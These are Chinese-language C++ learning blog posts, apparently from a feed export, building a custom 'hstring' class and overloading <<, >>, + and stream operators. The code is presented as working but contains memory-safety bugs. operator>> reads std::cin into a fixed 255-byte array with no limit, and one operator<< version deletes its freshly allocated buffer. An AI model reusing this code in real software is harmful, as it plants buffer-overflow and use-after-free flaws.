class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> no_char -1</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> hstring::_NO_CHAR = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">char</span> ch)&#123;</span><br><span class="line">    hsmLen = ch;                <span class="comment">//设置缓冲区</span></span><br><span class="line">    hsLen = <span class="number">0</span>;                    <span class="comment">//length = 0</span></span><br><span class="line">    c_str = <span class="keyword">new</span> <span class="type">char</span>[hsmLen];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">const</span> <span class="type">char</span> *str):<span class="built_in">hstring</span>()&#123;</span><br><span class="line">    <span class="built_in">copyStrs</span>(c_str, str);</span><br><span class="line">&#125;</span><br><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">const</span> hstring &amp;str):<span class="built_in">hstring</span>()&#123;</span><br><span class="line">    <span class="built_in">copyStrs</span>(c_str, str.c_str);</span><br><span class="line">&#125;</span><br><span class="line">hstring &amp;hstring::<span class="keyword">operator</span>=(<span class="type">const</span> hstring &amp;str)&#123;</span><br><span class="line">    <span class="built_in">copyStrs</span>(c_str, str.c_str);</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">hstring &amp;hstring::<span class="keyword">operator</span>&lt;&lt;(<span class="type">const</span> hstring &amp;str)&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> len = <span class="built_in">gethsLen</span>(str.c_str);       </span><br><span class="line">    len += hsLen - <span class="number">1</span>;               <span class="comment">//因为字符串\0结尾，两个字符串长度相加有一个\0就行</span></span><br><span class="line">    <span class="keyword">if</span> (len &gt; hsmLen)&#123;</span><br><span class="line">        <span class="type">char</span> *rstr = c_str;</span><br><span class="line">        c_str = <span class="keyword">new</span> <span class="type">char</span>[len];      <span class="comment">//重新分配字符串空间</span></span><br><span class="line">        hsmLen = len;               <span class="comment">//重置缓冲区长度</span></span><br><span class="line">        <span class="built_in">memcpy</span>(c_str,rstr,hsLen);</span><br><span class="line">        <span class="keyword">delete</span>[] c_str;             <span class="comment">//清理内存</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="keyword">this</span>-&gt;c_str  + hsLen <span class="number">-1</span>, str.c_str, len - hsLen + <span class="number">1</span>);</span><br><span class="line">    hsLen = len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">hstring &amp;hstring::<span class="keyword">operator</span>+(<span class="type">const</span> hstring &amp;str)&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span> &lt;&lt; str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hstring::~<span class="built_in">hstring</span>()&#123;</span><br><span class="line">    <span class="keyword">if</span> (c_str != <span class="literal">nullptr</span>) <span class="keyword">delete</span>[] c_str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> &amp;hstring::<span class="keyword">operator</span>[](<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> _index) <span class="type">const</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (_index &gt; hsLen)&#123;</span><br><span class="line">        <span class="keyword">return</span> _NO_CHAR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;c_str[_index];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">short</span> <span class="title">hstring::gethsLen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> <span class="type">const</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (str[len++] != <span class="string">&#x27;\0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hstring::copyStrs</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *source)</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> len = <span class="built_in">gethsLen</span>(source);</span><br><span class="line">    <span class="keyword">if</span> (len &gt; hsmLen)&#123;</span><br><span class="line">        <span class="keyword">delete</span>[] c_str;</span><br><span class="line">        c_str = <span class="keyword">new</span> <span class="type">char</span>[len];        <span class="comment">//如果字符串的长度大于缓冲区就重新设置</span></span><br><span class="line">        hsmLen = len;                <span class="comment">//重置内存长度</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(c_str, source, len);</span><br><span class="line">    hsLen = len;                    <span class="comment">//重置字符串长度</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::ostream &amp;<span class="keyword">operator</span>&lt;&lt;(std::ostream &amp;_cout, hstring _str)&#123;</span><br><span class="line">    _cout &lt;&lt; _str.<span class="built_in">rtstr</span>();</span><br><span class="line">    <span class="keyword">return</span> _cout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::istream &amp;<span class="keyword">operator</span>&gt;&gt;(std::istream &amp;_cin, hstring &amp;_str)&#123;</span><br><span class="line">    <span class="type">char</span> _len[<span class="number">0xff</span>];</span><br><span class="line">    _cin &gt;&gt; _len;</span><br><span class="line">    _str = _len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _cin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>对hstring的补充~</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重载&lt;&lt;和&gt;&gt;</title>
      <link href="/2022/06/26/operator2/"/>
      <url>/2022/06/26/operator2/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在c++里 <code>std::cout &lt;&lt; 和 std::cin &gt;&gt;</code>用多了可能都要忘了<code>&lt;&lt;&gt;&gt;</code>本质上是位移运算符。<br>只不过std本质上是一个命名空间，可能在里面也定义了类也带上了重载。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方法</span></span><br><span class="line">返回类型 <span class="keyword">operator</span>&gt;&gt;(类型 操作数);</span><br><span class="line"></span><br><span class="line"><span class="comment">//全局函数</span></span><br><span class="line">返回类型 <span class="keyword">operator</span>&gt;&gt;(类型 左操作数，类型 右操作数);</span><br></pre></td></tr></table></figure><p>这里还是以昨天hstring为例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hstring.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hstring</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">char</span> *c_str;            <span class="comment">//hstring =&gt; char *c_str</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> hsLen;    <span class="comment">//c_str length</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> hsmLen;    <span class="comment">//hstring 内存长度</span></span><br><span class="line">    <span class="function"><span class="type">unsigned</span> <span class="type">short</span> <span class="title">gethsLen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> <span class="type">const</span></span>;        <span class="comment">//hsLen属于私有成员，故此调用函数</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">copyStrs</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *source)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">hstring</span>();</span><br><span class="line">    <span class="built_in">hstring</span>(<span class="type">const</span> <span class="type">char</span> *str);</span><br><span class="line">    <span class="built_in">hstring</span>(<span class="type">const</span> hstring &amp;str);</span><br><span class="line">    hstring &amp;<span class="keyword">operator</span>=(<span class="type">const</span> hstring &amp;str);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">char</span> *<span class="title">rtstr</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> c_str; &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hstring.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hstring.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">hstring::<span class="built_in">hstring</span>()&#123;</span><br><span class="line">    hsmLen = <span class="number">0x32</span>;                <span class="comment">//设置缓冲区</span></span><br><span class="line">    hsLen = <span class="number">0</span>;                    <span class="comment">//length = 0</span></span><br><span class="line">    c_str = <span class="keyword">new</span> <span class="type">char</span>[hsmLen];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">const</span> <span class="type">char</span> *str)&#123;</span><br><span class="line">    <span class="built_in">copyStrs</span>(c_str, str);</span><br><span class="line">&#125;</span><br><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">const</span> hstring &amp;str)&#123;</span><br><span class="line">    <span class="built_in">copyStrs</span>(c_str, str.c_str);</span><br><span class="line">&#125;</span><br><span class="line">hstring &amp;hstring::<span class="keyword">operator</span>=(<span class="type">const</span> hstring &amp;str)&#123;</span><br><span class="line">    <span class="built_in">copyStrs</span>(c_str, str.c_str);</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">short</span> <span class="title">hstring::gethsLen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> <span class="type">const</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (str[len++] != <span class="string">&#x27;\0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hstring::copyStrs</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *source)</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> len = <span class="built_in">gethsLen</span>(source);</span><br><span class="line">    <span class="keyword">if</span> (len &gt; hsmLen)&#123;</span><br><span class="line">        c_str = <span class="keyword">new</span> <span class="type">char</span>[len];        <span class="comment">//如果字符串的长度大于缓冲区就重新设置</span></span><br><span class="line">        hsmLen = len;                <span class="comment">//重置内存长度</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(c_str, source, len);</span><br><span class="line">    hsLen = len;                    <span class="comment">//重置字符串长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="小问题1"><a href="#小问题1" class="headerlink" title="小问题1"></a>小问题1</h2><p>再次之前，先解决下之前有个函数可能存在内存泄漏</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">hstring::copyStrs</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *source)</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> len = <span class="built_in">gethsLen</span>(source);</span><br><span class="line">    <span class="keyword">if</span> (len &gt; hsmLen)&#123;</span><br><span class="line">        <span class="keyword">delete</span>[] c_str;                 <span class="comment">//如果长度超出缓冲区，那么就要清理掉之前的内存</span></span><br><span class="line">        c_str = <span class="keyword">new</span> <span class="type">char</span>[len];          <span class="comment">//如果字符串的长度大于缓冲区就重新设置</span></span><br><span class="line">        hsmLen = len;                   <span class="comment">//重置内存长度</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(c_str, source, len);</span><br><span class="line">    hsLen = len;                        <span class="comment">//重置字符串长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是重新分配内存前，应该清理掉原有的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">hstring &amp;<span class="keyword">operator</span>&lt;&lt;(<span class="type">const</span> hstring &amp;str);</span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"></span><br><span class="line">hstring &amp;hstring::<span class="keyword">operator</span>&lt;&lt;(<span class="type">const</span> hstring &amp;str)&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> len = <span class="built_in">gethsLen</span>(str.c_str);       </span><br><span class="line">    len += hsLen - <span class="number">1</span>;               <span class="comment">//因为字符串\0结尾，两个字符串长度相加有一个\0就行</span></span><br><span class="line">    <span class="keyword">if</span> (len &gt; hsmLen)&#123;</span><br><span class="line">        <span class="keyword">delete</span>[] c_str;             <span class="comment">//清理内存</span></span><br><span class="line">        c_str = <span class="keyword">new</span> <span class="type">char</span>[len];      <span class="comment">//重新分配字符串空间</span></span><br><span class="line">        hsmLen = len;               <span class="comment">//重置缓冲区长度</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="keyword">this</span>-&gt;c_str  + hsLen <span class="number">-1</span>, str.c_str, len - hsLen + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        this加不加无所谓，我调试的时候加上了。</span></span><br><span class="line"><span class="comment">        从c_str + c_str的长度-1 就是 \0那个位置覆盖</span></span><br><span class="line"><span class="comment">        然后写入形参传入的c_str</span></span><br><span class="line"><span class="comment">        最后长度就是len - this.c_str长度 + 1 这个+1就是给后面的字符串保留\0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    hsLen = len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="小问题2"><a href="#小问题2" class="headerlink" title="小问题2"></a>小问题2</h2><p><strong>在调试的时候发现了一个问题，就是构造函数，我们初始化的时候只写在了默认构造函数里，导致使用其它构造函数实例化的时候，成员变量没有初始化的问题，会有随机值产生。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">hstring::<span class="built_in">hstring</span>()&#123;</span><br><span class="line">    hsmLen = <span class="number">0x32</span>;                <span class="comment">//设置缓冲区</span></span><br><span class="line">    hsLen = <span class="number">0</span>;                    <span class="comment">//length = 0</span></span><br><span class="line">    c_str = <span class="keyword">new</span> <span class="type">char</span>[hsmLen];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">const</span> <span class="type">char</span> *str)&#123;</span><br><span class="line">    hsmLen = <span class="number">0x32</span>;                <span class="comment">//设置缓冲区</span></span><br><span class="line">    hsLen = <span class="number">0</span>;                    <span class="comment">//length = 0</span></span><br><span class="line">    c_str = <span class="keyword">new</span> <span class="type">char</span>[hsmLen];</span><br><span class="line">    <span class="built_in">copyStrs</span>(c_str, str);</span><br><span class="line">&#125;</span><br><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">const</span> hstring &amp;str)&#123;</span><br><span class="line">    hsmLen = <span class="number">0x32</span>;                <span class="comment">//设置缓冲区</span></span><br><span class="line">    hsLen = <span class="number">0</span>;                    <span class="comment">//length = 0</span></span><br><span class="line">    c_str = <span class="keyword">new</span> <span class="type">char</span>[hsmLen];</span><br><span class="line">    <span class="built_in">copyStrs</span>(c_str, str.c_str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以要注意，无论是哪个构造函数都要进行初始化，毕竟实例化的时候不管这些。</p><p>当然这样写看着又很雷同，于是可以用列表初始化替换掉一些：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">char</span> ch=<span class="number">0x32</span>)&#123;</span><br><span class="line">    hsmLen = ch;                <span class="comment">//设置缓冲区</span></span><br><span class="line">    hsLen = <span class="number">0</span>;                    <span class="comment">//length = 0</span></span><br><span class="line">    c_str = <span class="keyword">new</span> <span class="type">char</span>[hsmLen];</span><br><span class="line">&#125;</span><br><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">const</span> <span class="type">char</span> *str):<span class="built_in">hstring</span>()&#123;</span><br><span class="line">    <span class="built_in">copyStrs</span>(c_str, str);</span><br><span class="line">&#125;</span><br><span class="line">hstring::<span class="built_in">hstring</span>(<span class="type">const</span> hstring &amp;str):<span class="built_in">hstring</span>()&#123;</span><br><span class="line">    <span class="built_in">copyStrs</span>(c_str, str.c_str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//记得修改.h头文件里的构造函数 </span></span><br><span class="line"><span class="built_in">hstring</span>(<span class="type">char</span> ch);</span><br></pre></td></tr></table></figure><p>这样一来解决了一些重复的事情~~~~也确实是我上一章没注意到。</p><img src="/2022/06/26/operator2/000.png" class=""><p>实际效果也ok，能够完整的显示出来。</p><img src="/2022/06/26/operator2/001.png" class=""><p>而且重载可以连续套用。</p><p>那么说<code>&lt;&lt;</code> 相当于拼接字符串了，数学角度跟加法就差不多了。所以加号运算符重载的话可以套用了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hstring &amp;<span class="keyword">operator</span>+(<span class="type">const</span> hstring &amp;str);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">hstring &amp;hstring::<span class="keyword">operator</span>+(<span class="type">const</span> hstring &amp;str)&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span> &lt;&lt; str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/26/operator2/002.png" class=""><p>效果也是一样的，毕竟底层一样了。</p><hr><h2 id="缝缝补补"><a href="#缝缝补补" class="headerlink" title="缝缝补补"></a>缝缝补补</h2><p>然后是析构函数，析构函数也不用干啥，就是释放c_str就行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hstring::~<span class="built_in">hstring</span>()&#123;</span><br><span class="line">    <span class="keyword">if</span> (c_str != <span class="literal">nullptr</span>) <span class="keyword">delete</span>[] c_str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有个就是std::cout 的问题，他不能直接输出，而是通过我们的函数返回的。<br>学了重载就要给它优化一下。</p><img src="/2022/06/26/operator2/003.png" class=""><p>看到std::后面其实也是个参数，一个流的称呼。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">std::ostream &amp;<span class="keyword">operator</span>&lt;&lt;(std::ostream &amp;_cout, hstring _str)&#123;</span><br><span class="line">_cout &lt;&lt; _str.<span class="built_in">rtstr</span>();</span><br><span class="line"><span class="keyword">return</span> _cout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过重写输出流的&lt;&lt;重载，将hstring的参数直接拼接到输出流，然后返回。</p><img src="/2022/06/26/operator2/004.png" class=""><p>调用的时候也能看到是用的我们写的重载</p><img src="/2022/06/26/operator2/005.png" class=""><p>实际效果也没有差别。</p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; str &lt;&lt; <span class="string">&quot;1111&quot;</span> &lt;&lt; <span class="string">&quot;222&quot;</span> &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>这个时候，str后面的字符串所用的<code>&lt;&lt;</code>重载是属于std::cout的<br>它本质上就是<code>operator&lt;&lt;(operator&lt;&lt;(operator&lt;&lt;(std::cout,str),&quot;1111&quot;),&quot;222&quot;);</code><br>指定了输出流，然后参数一个一个通过<code>&lt;&lt;</code>写入。</p><p>指定了输出，就可以尝试一下输入</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::istream &amp;<span class="keyword">operator</span>&gt;&gt;(std::istream &amp;_cin, hstring &amp;_str)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>流要使用istream，i和o的区别就是input和output，输入输出的意思。</p><p>只不过这里输入的时候其实要注意缓冲区。。默认的输入流还真不知道要给多少合适。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">std::istream &amp;<span class="keyword">operator</span>&gt;&gt;(std::istream &amp;_cin, hstring &amp;_str)&#123;</span><br><span class="line"><span class="type">char</span> _len[<span class="number">0xff</span>];</span><br><span class="line">_cin &gt;&gt; _len;</span><br><span class="line">_str = _len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> _cin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>缓冲区不好定，就随便给个大的先做一下效果。<br>这样通过这个缓冲的字符串，可以给str有空计算然后写入。</p><img src="/2022/06/26/operator2/006.png" class=""><p>效果就是这样了~~~</p><hr><p>大致完善后</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hstring</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">char</span> *c_str;            <span class="comment">//hstring =&gt; char *c_str</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> hsLen;    <span class="comment">//c_str length</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> hsmLen;    <span class="comment">//hstring 内存长度</span></span><br><span class="line">    <span class="function"><span class="type">unsigned</span> <span class="type">short</span> <span class="title">gethsLen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> <span class="type">const</span></span>;        <span class="comment">//hsLen属于私有成员，故此调用函数</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">copyStrs</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *source)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">hstring</span>(<span class="type">char</span> ch);</span><br><span class="line">    <span class="built_in">hstring</span>(<span class="type">const</span> <span class="type">char</span> *str);</span><br><span class="line">    <span class="built_in">hstring</span>(<span class="type">const</span> hstring &amp;str);</span><br><span class="line">    hstring &amp;<span class="keyword">operator</span>=(<span class="type">const</span> hstring &amp;str);</span><br><span class="line">    hstring &amp;<span class="keyword">operator</span>&lt;&lt;(<span class="type">const</span> hstring &amp;str);</span><br><span class="line">    hstring &amp;<span class="keyword">operator</span>+(<span class="type">const</span> hstring &amp;str);</span><br><span class="line">    ~<span class="built_in">hstring</span>();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">char</span> *<span class="title">rtstr</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> c_str; &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">std::ostream &amp;<span class="keyword">operator</span>&lt;&lt;(std::ostream &amp;_cout, hstring _str);</span><br><span class="line">std::istream &amp;<span class="keyword">operator</span>&gt;&gt;(std::istream &amp;_cin, hstring &amp;_str);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hstring.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hstring.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">hstring::<span 